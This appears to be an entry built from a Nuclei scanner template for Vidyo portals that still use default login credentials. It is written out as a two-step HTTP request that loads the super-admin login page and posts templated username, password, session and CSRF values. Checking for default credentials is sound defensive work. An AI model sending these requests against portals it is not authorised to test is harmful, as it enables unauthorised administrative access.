# Vulnerability: Vidyo Default Login
**Classification:** CWE-522
**Source:** Nuclei Template (`vidyo-default-login.yaml`)

## Description
Vidyo default credentials were discovered.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /super/login.html?lang=en HTTP/1.1
Host: {{Hostname}}
Origin: {{BaseURL}}

POST /super/super_security_check;jsessionid={{session}}?csrf_tkn={{csrf_tkn}} HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Origin: {{BaseURL}}
Referer: {{RootURL}}/super/login.html?lang=en
Cookie: JSESSIONID={{session}} ; VidyoPortalSuperLanguage=en

username={{username}}&password={{password}}
```

